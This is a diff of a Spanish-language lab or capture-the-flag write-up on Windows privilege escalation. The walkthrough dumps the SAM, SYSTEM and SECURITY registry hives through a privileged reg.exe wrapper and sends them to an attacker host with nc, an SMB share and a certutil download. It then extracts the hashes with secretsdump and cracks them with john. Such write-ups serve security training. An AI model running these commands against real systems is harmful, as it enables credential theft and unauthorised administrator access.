@@ -1,30 +1,62 @@
 Root.txt
-whoami /all or net user username
-net localgroup group
-...
 
-//reg save HKLM\SECURITY c:\path\security.save
-//reg save HKLM\SYSTEM c:\path\system.save
-//reg save HKLM\SAM c:\path\sam.save
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
 
-C:\Windows\System32\script.exe -ArgumentList 'save HKLM\SECURITY security.save'
-C:\Windows\System32\script.exe -ArgumentList 'save HKLM\SYSTEM system.save'
-C:\Windows\System32\script.exe -ArgumentList 'save HKLM\SAM sam.save'
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
 
-(Explicar que son 3 comandos, el -w 120,SeBackupPrivilege, ...)
-Guardar en host:
-    1.- Añadimos nc.exe:
-        python3 -m http.server
-        Descargamos en windows. Poner en buscador: 192.168.56.1:8000 y descargar
-    2.- En host: nc -lvp PORT > sam.save/security.save/system.save
-        En windows: 
-            Abrir cmd:  runas /user:username cmd y poner contraseña anterior
-                        nc -w 120 IP PORT < sam.save/security.save/system.save
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario reg.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+Visitamos la pagina web lolbas: https://lolbas-project.github.io/# y buscamos el binario.
+Y nos pone lo que tenemos que hacer para realizar la escalada.
+
+En este caso, vamos a intentar obtener las credenciales del PC, en vez de intentar ejecutar codigo como si fueramos el administrador.
+
+Ejecutamos los siguientes comandos de forma separada:
+    - reg save HKLM\SECURITY c:\path\security.save
+    - reg save HKLM\SYSTEM c:\path\system.save
+    - reg save HKLM\SAM c:\path\sam.save
+
+pero nosotros tenemos que poner lo siguiente:
+    - C:\Users\Administrator\Desktop\script.exe -ArgumentList 'save HKLM\SECURITY c:\path\security.save'
+    - C:\Users\Administrator\Desktop\script.exe -ArgumentList 'save HKLM\SYSTEM c:\path\system.save'
+    - C:\Users\Administrator\Desktop\script.exe -ArgumentList 'save HKLM\SAM c:\path\sam.save'
+
+Ahora, nos transferimos estos archivos a nuestro PC:
+    - Forma 1:(si no deja, hacer el la segunda forma)
+        - impacket-smbserver smbFolder $(pwd) -smb2support -> si no funciona quitar ultimo parametro
+        - copy file \\IP\smbFolder\security.save
+          copy file \\IP\smbFolder\system.save
+          copy file \\IP\smbFolder\sam.save
+    
+    -Forma 2:
+        - Descargar nc.exe en la maquina victima:
+            - python3 -m http.server 
+            - certutil -f -urlcache -split http://IP:PORT/nc.exe -> PORT por defecto es el 8000
+        - Una vez descargado, nos transferimos los .save:
+            - En nuestra maquina:
+                - nc -lvp PORT > security.save 
+            - En maquina victima:
+                - Abrimos una cmd.exe -> runsa /user:username cmd.exe y ponemos nuestra password
+                - nc -w 120 IP PORT <  security.save y de la misma forma los otros dos. 
+
+Una vez descargados los .save en nuestra maquina, miramos que el tamaño sea igual en ambas maquinas, pues igual no se han descargado completamente.
+
 
 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL > result.txt
-//john --format=NT --show hash
-john --rules --stdout --wordlist=pass.txt > pass2.txt
-john --format=NT --wordlist=pass2.txt hash
-john --format=NT --show result.txt
 
+Y ahora intentamos crackear las contraseñas con john:
+    - john --format=NT --wordlist=path/passwords.txt hash
+    - john --format=NT --show result.txt
 
+Pero no encuentra la contraseña. Puede que el administrador u otros usuarios hayan usado alguna contraseña mas robusta de lo normal. Nos creamos un diccionario mas extenso y probamos de nuevo:
+    - john --rules --stdout --wordlist=path/passwords.txt > pass2.txt
+    - john --format=NT --wordlist=pass2.txt hash
+    - john --format=NT --show result.txt
+
+Ahora si, hemos crackeado la contraseña del administrador y podemos conectarnos como él.
